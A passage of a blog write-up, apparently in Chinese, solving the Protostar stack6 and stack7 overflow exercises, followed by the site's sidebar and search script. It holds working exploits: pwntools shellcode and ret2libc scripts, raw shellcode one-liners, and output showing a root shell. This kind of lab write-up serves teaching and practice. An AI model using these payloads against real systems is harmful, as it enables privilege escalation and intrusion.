+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">l GDB环境与非GDB环境下运行程序时，栈缓冲区的位置不一样；非GDB环境下的地址大于GDB环境下的地址；</span><br><span class="line"></span><br><span class="line">l 可以使用NOP Slot来消除栈缓冲区位置的不确定性；</span><br><span class="line"></span><br><span class="line">l gets缓冲区溢出需要进行特别的处理；</span><br><span class="line"></span><br><span class="line">使用特定的shellcode（关闭并重新打开stdin）或者使用管道；</span><br><span class="line"></span><br><span class="line">使用管道的示例：</span><br><span class="line"></span><br><span class="line">( python ~/pwn1.py ; cat ) | /opt/protostar/bin/stack5</span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/luozhaotian/article/details/79894994" target="_blank" rel="noopener">https://blog.csdn.net/luozhaotian/article/details/79894994</a></p>
+<h3 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h3><h4 id="Return-to-shellcode"><a href="#Return-to-shellcode" class="headerlink" title="Return to shellcode"></a>Return to shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line">payload = sh+ <span class="string">'a'</span>*(<span class="number">80</span>-len(sh))+p32(<span class="number">0xf6ffefbc</span>)+<span class="string">'0x90'</span>*<span class="number">20</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h4><p>As we cannot use the return address starting with <strong>0xbf</strong> we can simply use a ret instruction instead as the stack is executable this will put next memory address into EIP, and our shellcode will get executed which in this case is simply a <strong>trap</strong>instruction. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&apos;+(80-29)*&apos;\xcc&apos;+&apos;\xf9\x84\x04\x08&apos;+&apos;\xbc\xef\xff\xf6&apos;&quot;; cat) | ./stack6</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#payload=shellcode+padding+ret地址+shellcode地址</span></span><br><span class="line">payload = sh+ <span class="string">'a'</span>*(<span class="number">80</span>-len(sh))+p32(<span class="number">0x080484f9</span>) + p32(<span class="number">0xf6ffefbc</span>)+<span class="string">'0x90'</span>*<span class="number">20</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="Return-to-libc"><a href="#Return-to-libc" class="headerlink" title="Return to libc"></a>Return to libc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br><span class="line">gdb-peda$ b getpath</span><br><span class="line">Breakpoint 1 at 0x804848a: file stack6/stack6.c, line 11.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/nick/protostar/bin/stack6 </span><br><span class="line"></span><br><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0xf7fba000 --&gt; 0x1a6da8 </span><br><span class="line">ECX: 0x63c1cf18 </span><br><span class="line">EDX: 0xffffd5d4 --&gt; 0xf7fba000 --&gt; 0x1a6da8 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffd598 --&gt; 0xffffd5a8 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0x59ff8b08 </span><br><span class="line">EIP: 0x804848a (&lt;getpath+6&gt;:	mov    eax,0x80485d0)</span><br><span class="line">EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048484 &lt;getpath&gt;:	push   ebp</span><br><span class="line">   0x8048485 &lt;getpath+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x8048487 &lt;getpath+3&gt;:	sub    esp,0x68</span><br><span class="line">=&gt; 0x804848a &lt;getpath+6&gt;:	mov    eax,0x80485d0</span><br><span class="line">   0x804848f &lt;getpath+11&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x8048492 &lt;getpath+14&gt;:	call   0x80483c0 &lt;printf@plt&gt;</span><br><span class="line">   0x8048497 &lt;getpath+19&gt;:	mov    eax,ds:0x8049720</span><br><span class="line">   0x804849c &lt;getpath+24&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0x59ff8b08 </span><br><span class="line">0004| 0xffffd534 --&gt; 0xffffd558 --&gt; 0xf7e1fc34 --&gt; 0x2aad </span><br><span class="line">0008| 0xffffd538 --&gt; 0xffffd550 --&gt; 0xffffffff </span><br><span class="line">0012| 0xffffd53c --&gt; 0x80482a1 (&quot;__libc_start_main&quot;)</span><br><span class="line">0016| 0xffffd540 --&gt; 0xf7ffd938 --&gt; 0x0 </span><br><span class="line">0020| 0xffffd544 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd548 --&gt; 0xc2 </span><br><span class="line">0028| 0xffffd54c --&gt; 0xf7ea7716 (test   eax,eax)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getpath () at stack6/stack6.c:11</span><br><span class="line">11	stack6/stack6.c: No such file or directory.</span><br><span class="line">gdb-peda$ p system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e52e70 &lt;system&gt;</span><br><span class="line">gdb-peda$ x/s 0xf7e52e70</span><br><span class="line">0xf7e52e70 &lt;system&gt;:	&quot;S\203\354\b\213D$\020\350\216&lt;\016&quot;</span><br><span class="line">gdb-peda$ info proc map</span><br><span class="line">process 22915</span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">	Start Addr   End Addr       Size     Offset objfile</span><br><span class="line">	 0x8048000  0x8049000     0x1000        0x0 /home/nick/protostar/bin/stack6</span><br><span class="line">	 0x8049000  0x804a000     0x1000        0x0 /home/nick/protostar/bin/stack6</span><br><span class="line">	0xf7e12000 0xf7e13000     0x1000        0x0 </span><br><span class="line">	0xf7e13000 0xf7fb8000   0x1a5000        0x0 /lib32/libc-2.19.so</span><br><span class="line">	0xf7fb8000 0xf7fba000     0x2000   0x1a5000 /lib32/libc-2.19.so</span><br><span class="line">	0xf7fba000 0xf7fbb000     0x1000   0x1a7000 /lib32/libc-2.19.so</span><br><span class="line">	0xf7fbb000 0xf7fbf000     0x4000        0x0 </span><br><span class="line">	0xf7fd8000 0xf7fd9000     0x1000        0x0 </span><br><span class="line">	0xf7fd9000 0xf7fdb000     0x2000        0x0 [vvar]</span><br><span class="line">	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]</span><br><span class="line">	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.19.so</span><br><span class="line">	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.19.so</span><br><span class="line">	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.19.so</span><br><span class="line">	0xfffdd000 0xffffe000    0x21000        0x0 [stack]</span><br><span class="line">gdb-peda$ find 0xf7e13000,+999999 ,&quot;/bin/sh&quot;</span><br><span class="line">Searching for &apos;0xf7e13000,+999999&apos; in: ,/bin/sh ranges</span><br><span class="line">Not found</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/protostar/bin$ strings -a -t x /lib32/libc-2.19.so | grep /bin/sh</span><br><span class="line"> 15da8c /bin/sh</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> gdb-peda$ x/s 0xf7e13000+0x15da8c</span><br><span class="line">0xf7f70a8c:	&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
+<p>前面在ubuntu虚拟机执行，但是找到的system是错误的，不可以执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0xf7f70a8c</span></span><br><span class="line"></span><br><span class="line">system_plt = <span class="number">0xf7e52e70</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">80</span>+p32(system_plt)+<span class="string">'b'</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">conn.recvuntil(<span class="string">"input path please: "</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<p>在Protostar虚拟机一样找到system和/bin/sh地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ (python -c &quot;print &apos;a&apos;*80+&apos;\xb0\xff\xec\xb7&apos;+&apos;\xc0\x60\xec\xb7&apos;+&apos;\xbf\x63\xfb\xb7&apos;&quot;; cat) | ./stack6</span><br><span class="line">input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa°ÿ춡aaaaaaaaaaa°ÿ츀`췿c</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br></pre></td></tr></table></figure>
+<h3 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h3><p>gcc的编译特性使用<code>__builtin_return_address(level)</code>打印出一个函数的堆栈地址。其中 level代表是堆栈中第几层调用地址，<code>__builtin_return_address(0)</code>表示第一层调用地址，即当前函数，<code>__builtin_return_address(1)</code>表示第二层。 </p>
+<p><a href="http://abcdxyzk.github.io/blog/2013/11/20/lang-c-buildin-addr/" target="_blank" rel="noopener">http://abcdxyzk.github.io/blog/2013/11/20/lang-c-buildin-addr/</a></p>
+<h4 id="Ret2text-1"><a href="#Ret2text-1" class="headerlink" title="Ret2text"></a>Ret2text</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line">payload = sh+ <span class="string">'a'</span>*(<span class="number">80</span>-len(sh))+p32(<span class="number">0x08048544</span>) + p32(<span class="number">0xf6ffefbc</span>)+<span class="string">'0x90'</span>*<span class="number">20</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&apos;+(80-29)*&apos;\xcc&apos;+&apos;\xbf\x84\x04\x08&apos;&quot;; cat) | nc localhost 4000</span><br></pre></td></tr></table></figure>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Protostart%20Stack%20Writeup.assets/1534999688770.png" alt="1534999688770"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/14/百度杯十二月场-blog进阶版/" rel="next" title="百度杯十二月场-blog进阶版">
+                <i class="fa fa-chevron-left"></i> 百度杯十二月场-blog进阶版
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/24/ROP入门/" rel="prev" title="ROP入门">
+                ROP入门 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Lhaihai" />
+            
+              <p class="site-author-name" itemprop="name">Lhaihai</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">55</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/TheReturnOfTheKing/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#stack0"><span class="nav-number">1.</span> <span class="nav-text">stack0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack1"><span class="nav-number">2.</span> <span class="nav-text">stack1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack2"><span class="nav-number">3.</span> <span class="nav-text">stack2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack3"><span class="nav-number">4.</span> <span class="nav-text">stack3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack4"><span class="nav-number">5.</span> <span class="nav-text">stack4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack5"><span class="nav-number">6.</span> <span class="nav-text">stack5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack6"><span class="nav-number">7.</span> <span class="nav-text">stack6</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Return-to-shellcode"><span class="nav-number">7.1.</span> <span class="nav-text">Return to shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ret2text"><span class="nav-number">7.2.</span> <span class="nav-text">Ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Return-to-libc"><span class="nav-number">7.3.</span> <span class="nav-text">Return to libc</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack7"><span class="nav-number">8.</span> <span class="nav-text">stack7</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ret2text-1"><span class="nav-number">8.1.</span> <span class="nav-text">Ret2text</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-117483741-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-117483741-1');
+</script>
+
+<div class="copyright">&copy; 2018/3/11 &mdash; <span itemprop="copyrightYear">2018</span>
+
+		
+
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lhaihai</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye">本站总访问量</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
